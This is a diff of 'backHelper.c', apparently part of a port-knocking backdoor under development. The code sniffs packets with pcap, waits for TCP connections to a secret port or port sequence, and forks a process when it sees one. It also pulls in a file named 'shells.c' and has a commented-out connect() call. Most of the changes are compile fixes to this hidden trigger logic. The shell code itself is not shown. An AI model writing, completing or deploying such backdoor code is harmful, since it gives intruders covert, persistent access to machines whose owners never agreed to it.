@@ -1,5 +1,3 @@
-#pragma once
-
 /*  File: backHelper.c
 *   Author: Nunyabeeswax
 *   Date: 6/7/2021
@@ -8,13 +6,10 @@
 */
 
 #include "backHelper.h"
-
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/wait.h>
-#include <strings.h>
-
-
+#include "shells.c"
 
 #ifdef MULTI_KNOCK
     char* key_ports[NUM_PORTS] = {MULTI_KNOCK};
@@ -54,11 +49,9 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
 	/* print source and destination IP addresses */
 	#ifdef DEBUG
-		char *srcip = inet_ntoa(ip->ip_src));
-		printf("       From: %s\n", srcip);
+		printf("       From: %s\n", inet_ntoa(ip->ip_src));
 		printf("         To: %s\n", inet_ntoa(ip->ip_dst));
 	#endif
-//save IP to variable and then 
 
 	/* determine protocol break if not TCP */
 	switch(ip->ip_p) {
@@ -93,9 +86,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		printf("   Src port: %d\n", ntohs(tcp->th_sport));
 		printf("   Dst port: %d\n", ntohs(tcp->th_dport));
 	#endif
-
-	#ifdef SINGLE_KNOCK // TBD
 	int prt;
+	#ifdef SINGLE_KNOCK // TBD
 	sscanf(SINGLE_KNOCK,"%d", &prt);
 	if( ntohs(tcp->th_dport) == prt){
 		switch (fork()) {
@@ -117,7 +109,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	#endif
 
 	#ifdef MULTI_KNOCK
-	int prt;
 	sscanf(key_ports[num_success],"%d", &prt);
 
 	if( ntohs(tcp->th_dport) ==  prt){
@@ -156,15 +147,13 @@ void singleKnock(){
 
 void multiKnock(){
     printf("\n--------- MULTIPLE KNOCKS -------\n");
-
-
+    //connect();
 }
-
 
 int getRandom(){
     #ifdef SLEEP
-        int slptime = SLEEP;
-        //sscanf(SLEEP,"%d", &slptime);
+        int slptime;
+        sscanf(SLEEP,"%d", &slptime);
     #else
         int slptime = rand() % 6 + 1;
     #endif
@@ -178,4 +167,3 @@ int my_perror(char* msg){
     #endif
     return EXIT_FAILURE;
 }
-
